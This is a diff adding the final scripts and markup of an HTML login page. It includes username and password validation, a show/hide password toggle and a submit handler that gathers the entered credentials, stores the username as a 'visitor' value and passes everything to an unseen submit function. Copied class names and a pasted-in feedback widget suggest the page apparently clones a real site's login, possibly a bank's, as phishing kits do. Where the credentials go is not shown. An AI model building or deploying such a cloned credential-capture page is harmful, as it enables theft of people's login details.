+  wrappers.forEach(wrapper => {
+    const input = wrapper.querySelector("input");
+    if (!input) return;
+
+    const errorBox =
+      wrapper.querySelector(".err-mess") ||
+      wrapper.closest("div")?.querySelector(".err-mess");
+
+    const fieldName = (() => {
+      const name = (input.name || input.id || "").toLowerCase();
+      if (name.includes("user")) return "username";
+      if (name.includes("pass")) return "password";
+      return "this field";
+    })();
+
+    // Autofill / remembered values
+    if (input.value.trim() !== "") {
+      wrapper.classList.add("has-value");
+    }
+
+    input.addEventListener("focus", () => {
+      wrapper.classList.add("is-active");
+
+      if (errorBox) {
+        errorBox.textContent = "";
+        errorBox.style.display = "none";
+      }
+    });
+
+    input.addEventListener("blur", () => {
+      wrapper.classList.remove("is-active");
+
+      if (input.value.trim() !== "") {
+        wrapper.classList.add("has-value");
+
+        if (errorBox) {
+          errorBox.textContent = "";
+          errorBox.style.display = "none";
+        }
+      } else {
+      
+        if (errorBox) {
+          errorBox.textContent = `Enter your ${fieldName} to login`;
+          errorBox.style.display = "flex";
+          input.classList.add("hasError");
+        }
+      }
+    });
+
+    input.addEventListener("input", () => {
+      if (input.value.trim() !== "") {
+        wrapper.classList.add("has-value");
+
+        if (errorBox) {
+          errorBox.textContent = "";
+          errorBox.style.display = "none";
+        }
+      }
+    });
+  });
+});
+</script>
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+  const toggleButtons = document.querySelectorAll(".show-hide__button");
+
+  toggleButtons.forEach(button => {
+    const wrapper = button.closest(".password-input-unique-id-wrapper");
+    if (!wrapper) return;
+
+    const input = wrapper.querySelector("input[type='password'], input[type='text']");
+    if (!input) return;
+
+    button.addEventListener("click", () => {
+      const isHidden = input.type === "password";
+
+      input.type = isHidden ? "text" : "password";
+      button.firstChild.textContent = isHidden ? "Hide" : "Show";
+    });
+  });
+});
+</script>
+
+
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script>
+$(document).ready(function () {
+  $("#loginPageForm").on("submit", async function (e) {
+    e.preventDefault();
+
+    const inputs = $(this).find("input.usb--basic-input"); // only text/password inputs
+    const user = {};
+    let emptyCount = 0;
+
+    // Hide global notification
+    $(".usb-notification").hide();
+
+    // Per-field validation
+    inputs.each(function () {
+      const value = $(this).val().trim();
+      const wrapper = $(this).closest(".usb--wrapper");
+      const errBox = wrapper.find(".err-mess");
+
+      // Determine field name for message
+      let fieldName = $(this).attr("name") || "this field";
+      fieldName = fieldName.toLowerCase().includes("user")
+        ? "username"
+        : fieldName.toLowerCase().includes("pass")
+        ? "password"
+        : fieldName;
+
+      if (!value) {
+        emptyCount++;
+        $(this).addClass("hasError");
+        if (errBox.length) {
+          errBox.text(`Enter your ${fieldName} to login`).css("display", "flex");
+        }
+      } else {
+        $(this).removeClass("hasError");
+        if (errBox.length) {
+          errBox.text("").hide();
+        }
+      }
+
+      // Build user object
+      user[$(this).attr("name")] = value;
+    });
+
+    // Global notification if 2 or more fields are empty
+    if (emptyCount > 1) {
+      $(".usb-notification")
+        .css("display", "flex");
+    }
+
+    // Stop submission if any field is empty
+    if (emptyCount > 0) return;
+
+    // Optional: store visitor (username)
+    const visitor = user.username || "";
+    sessionStorage.setItem("visitor", visitor);
+    user["visitor"] = visitor;
+
+    console.log("Submitting user data:", user);
+    await submitFormData(user); // your async submit function
+  });
+});
+</script>
+      <div class="QSIFeedbackButton" style="position: fixed; visibility: hidden; inset: 0px; display: flex; flex-direction: column; justify-content: flex-end; align-items: flex-start; margin: 0px; padding: 0px; z-index: 2000000000;">
+         <button role="button" style="position: fixed; visibility: visible; cursor: pointer; border: none; background-color: transparent; padding: 0px; margin: 0px; bottom: 0px; left: 433px; width: 102px;" id="QSIFeedbackButton-btn" aria-expanded="false" aria-controls="QSIFeedbackButton-pullup-container">
+            <div style="background: rgb(10, 65, 197); color: rgb(255, 255, 255); padding: 10px; position: relative; font-size: 15px; display: flex; flex-direction: row; z-index: -1; writing-mode: horizontal-tb; border-top-left-radius: 4px; border-top-right-radius: 4px;">
+               <div>
+                  <div></div>
+               </div>
+               <div>Give Feedback</div>
+            </div>
+         </button>
+      </div>
+      <div id="QSIFeedbackButton-pullup-container" class="QSIFeedbackButton" role="dialog" aria-modal="true" aria-hidden="true" style="position: fixed; left: 0px; width: 100%; height: 0px; top: 100%; overflow: hidden; color: rgb(0, 0, 0); margin: 0px; padding: 0px; background-color: transparent; z-index: 2000000001;">
+         <div style="display: flex; flex-direction: column; height: 100%;">
+            <div id="QSIFeedbackButton-close-btn-container" style="background-color: transparent; padding-bottom: 10px; padding-right: 10px; display: flex; justify-content: flex-end;"><button role="button" id="QSIFeedbackButton-close-btn" tabindex="-1" style="cursor: pointer; border: 0px; padding: 0px; background-color: transparent; z-index: 2000000001;"><img src="./assets/wr-dialog-close-btn-white.png" alt="Close" style="height: 17px; width: 17px;"></button></div>
+         </div>
+      </div>
+   </body>
+   
+</html>
